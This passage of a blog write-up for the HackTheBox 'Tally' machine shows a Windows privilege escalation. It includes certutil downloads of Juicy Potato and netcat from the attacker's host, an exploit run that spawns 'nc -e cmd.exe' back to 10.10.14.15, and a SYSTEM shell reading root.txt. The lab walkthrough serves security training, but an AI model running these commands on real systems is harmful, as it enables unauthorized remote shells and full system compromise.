+<span class="go">connect to [10.10.14.15] from (UNKNOWN) [10.10.10.59] 57196</span>
+<span class="go">Windows PowerShell running as user Sarah on TALLY</span>
+<span class="go">Copyright (C) 2015 Microsoft Corporation. All rights reserved.</span>
+
+<span class="go">PS C:\Windows\system32&gt;whoami</span>
+<span class="go">tally\sarah</span>
+</pre></div>
+
+
+<p>Running systeminfo shows we are dealing with a Windows Server 2016:</p>
+<div class="highlight"><pre><span></span><span class="go">PS C:\users\sarah\desktop&gt; systeminfo</span>
+
+<span class="go">Host Name:                 TALLY</span>
+<span class="go">OS Name:                   Microsoft Windows Server 2016 Standard</span>
+<span class="go">OS Version:                10.0.14393 N/A Build 14393</span>
+<span class="go">OS Manufacturer:           Microsoft Corporation</span>
+<span class="go">OS Configuration:          Standalone Server</span>
+<span class="go">OS Build Type:             Multiprocessor Free</span>
+<span class="go">Registered Owner:          Windows User</span>
+<span class="go">Registered Organization:   </span>
+<span class="go">Product ID:                00376-30726-67778-AA877</span>
+<span class="go">Original Install Date:     28/08/2017, 15:43:34</span>
+<span class="go">System Boot Time:          18/05/2020, 21:37:00</span>
+<span class="go">System Manufacturer:       VMware, Inc.</span>
+<span class="go">System Model:              VMware Virtual Platform</span>
+<span class="go">System Type:               x64-based PC</span>
+<span class="go">Processor(s):              2 Processor(s) Installed.</span>
+<span class="go">                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz</span>
+<span class="go">                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz</span>
+<span class="go">BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018</span>
+<span class="go">Windows Directory:         C:\Windows</span>
+<span class="go">System Directory:          C:\Windows\system32</span>
+<span class="go">Boot Device:               \Device\HarddiskVolume1</span>
+<span class="go">System Locale:             en-gb;English (United Kingdom)</span>
+<span class="go">Input Locale:              en-gb;English (United Kingdom)</span>
+<span class="go">Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London</span>
+<span class="go">Total Physical Memory:     2,047 MB</span>
+<span class="go">Available Physical Memory: 172 MB</span>
+<span class="go">Virtual Memory: Max Size:  4,907 MB</span>
+<span class="go">Virtual Memory: Available: 764 MB</span>
+<span class="go">Virtual Memory: In Use:    4,143 MB</span>
+<span class="go">Page File Location(s):     C:\pagefile.sys</span>
+<span class="go">Domain:                    HTB.LOCAL</span>
+<span class="go">Logon Server:              \\TALLY</span>
+<span class="go">Hotfix(s):                 2 Hotfix(s) Installed.</span>
+<span class="go">                           [01]: KB3199986</span>
+<span class="go">                           [02]: KB4015217</span>
+<span class="go">Network Card(s):           1 NIC(s) Installed.</span>
+<span class="go">                           [01]: Intel(R) 82574L Gigabit Network Connection</span>
+<span class="go">                                 Connection Name: Ethernet0</span>
+<span class="go">                                 DHCP Enabled:    No</span>
+<span class="go">                                 IP address(es)</span>
+<span class="go">                                 [01]: 10.10.10.59</span>
+<span class="go">                                 [02]: fe80::9ae:129:54ea:ab30</span>
+<span class="go">                                 [03]: dead:beef::9ae:129:54ea:ab30</span>
+<span class="go">Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.</span>
+</pre></div>
+
+
+<p>We can also see that the <code>SeImpersonatePrivilege</code> is enabled:</p>
+<div class="highlight"><pre><span></span><span class="go">PS C:\Windows\system32&gt; whoami /priv</span>
+
+<span class="go">PRIVILEGES INFORMATION</span>
+<span class="go">----------------------</span>
+
+<span class="go">Privilege Name                Description                               State   </span>
+<span class="go">============================= ========================================= ========</span>
+<span class="go">SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled</span>
+<span class="go">SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled</span>
+<span class="go">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled </span>
+<span class="go">SeImpersonatePrivilege        Impersonate a client after authentication Enabled </span>
+<span class="go">SeCreateGlobalPrivilege       Create global objects                     Enabled </span>
+<span class="go">SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled</span>
+</pre></div>
+
+
+<p>This means we can use Juicy Potato so I download it to the box:</p>
+<div class="highlight"><pre><span></span><span class="go">PS C:\users\sarah\desktop&gt; certutil -urlcache -split -f http://10.10.14.15/JuicyPotato.exe jp.exe       </span>
+<span class="go">****  Online  ****                                                                                      </span>
+<span class="go">  000000  ...                                                                                                                                                                                                    </span>
+<span class="go">  052e00                                                                                                                                                                                                         </span>
+<span class="go">CertUtil: -URLCache command completed successfully.</span>
+</pre></div>
+
+
+<p>I also download a 64 bit version of netcat:</p>
+<div class="highlight"><pre><span></span><span class="go">PS C:\users\sarah\desktop&gt; certutil -urlcache -split -f http://10.10.14.15/nc64.exe nc.exe</span>
+<span class="go">****  Online  ****</span>
+<span class="go">  0000  ...</span>
+<span class="go">  b0d8</span>
+<span class="go">CertUtil: -URLCache command completed successfully.</span>
+</pre></div>
+
+
+<p>Then I ran the exploit:</p>
+<div class="highlight"><pre><span></span><span class="go">PS C:\users\sarah\desktop&gt; ./jp.exe -l 1234 -t * -p nc.exe -a &quot;-e cmd.exe 10.10.14.15 4444&quot; -c &quot;{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}&quot;</span>
+<span class="go">Testing {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 1234</span>
+<span class="go">......</span>
+<span class="go">[+] authresult 0</span>
+<span class="go">{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM</span>
+
+<span class="go">[+] CreateProcessWithTokenW OK</span>
+</pre></div>
+
+
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> sudo nc -lnvp <span class="m">4444</span>
+<span class="go">listening on [any] 4444 ...</span>
+<span class="go">connect to [10.10.14.15] from (UNKNOWN) [10.10.10.59] 57353</span>
+<span class="go">Microsoft Windows [Version 10.0.14393]</span>
+<span class="gp gp-VirtualEnv">(c)</span> <span class="go">2016 Microsoft Corporation. All rights reserved.</span>
+
+<span class="go">C:\Windows\system32&gt;whoami</span>
+<span class="go">whoami</span>
+<span class="go">nt authority\system</span>
+
+<span class="go">C:\Windows\system32&gt;type C:\users\administrator\desktop\root.txt</span>
+<span class="go">type C:\users\administrator\desktop\root.txt</span>
+<span class="go">60****************************da</span>
+</pre></div>
+			<style>
+#pcs-comment-form input,
+#pcs-comment-form textarea {
+	width: 100%;
+}
+#pcs-comment-form-display-replyto {
+	border: solid 1px black;
+	padding: 2px;
+}
+#pcs-comment-form-display-replyto p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+#pcs-comments ul {
+	list-style: none;
+}
+#pcs-comments .comment-left {
+	display: table-cell;
+	padding-right: 10px;
+}
+#pcs-comments .comment-body {
+	display: table-cell;
+	vertical-align: top;
+	width: 100%;
+}
+</style>
+
+	<section id="pcs-comments">
+	<header>
+		<h2>Comments</h2>
+		<hr/>
+	</header>
+		<p>There are no comments yet.</p>
+	<section>
+	<form id="pcs-comment-form" action="#">
+		<legend>Add a Comment</legend>
+		<input type="hidden" id="pcs-comment-form-input-replyto">
+		<fieldset>
+			<label for="pcs-comment-form-input-name">Name</label>
+			<input  id="pcs-comment-form-input-name" type="text" placeholder="Enter your name or nickname" />
+		</fieldset>
+		<fieldset>
+			<label for="pcs-comment-form-input-website">Website</label>
+			<input  id="pcs-comment-form-input-website" type="text" placeholder="Enter your website (optional)" />
+		</fieldset>
+		<fieldset>
+			<label   for="pcs-comment-form-input-textarea">Your Comment</label>
+			<textarea id="pcs-comment-form-input-textarea" rows="5" style="resize:vertical;" placeholder="Your comment"></textarea>
+			<p>You can use the <a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a> syntax to format your comment.</p>
+			<div style="display: none; " id="pcs-comment-form-display-replyto"></div>
+		</fieldset>
+
+		<button type="submit"
+				id="pcs-comment-form-button-submit"
+				>Post via email</button>
+
+			<a href="https://sittingducks.io/feeds/comment.Tally.atom.xml">
+				Comment Atom Feed
+			</a>
+	</form>
+</section>
+
+</section>
+
+			<script type="text/javascript" src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+	<script type="text/javascript" src="https://sittingducks.io/theme/js/comments.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			CommentSystem.email_user   = "sittingducks.io";
+			CommentSystem.email_domain = "protonmail.com";
+			CommentSystem.display_replyto_html = function(comment_content, article_slug, author) { 
+				return ''
+					+ '<button style="float:right;" onclick="CommentSystem.cancelReply(); return false;" title="Cancel the reply">'
+					+ 	'×'
+					+ '</button>'
+					+ '<p>This comment will be posted as a reply to \'<a title="'+comment_content+'" href="#comment-'+article_slug+'">'+author+'</a>\'</p>';
+			};
+
+			$('#pcs-comment-form').on("submit",
+				function( event )
+				{
+					event.preventDefault();
+					$(location).attr('href', CommentSystem.getMailtoLink("Tally"));
+				}
+			);
+		});
+	</script>
+
+
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />
+                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+  
+ <!-- <script src="https://sittingducks.io/theme/js/jquery.min.js"></script> -->
+	<!-- Make sure jquery is loaded first, then load colorbox -->
+  <script src="https://sittingducks.io/theme/js/jquery.colorbox-min.js"></script>
+  <script src="https://sittingducks.io/theme/js/load-colorbox.js"></script>
+
+
+  
+  
+</body>
+</html>
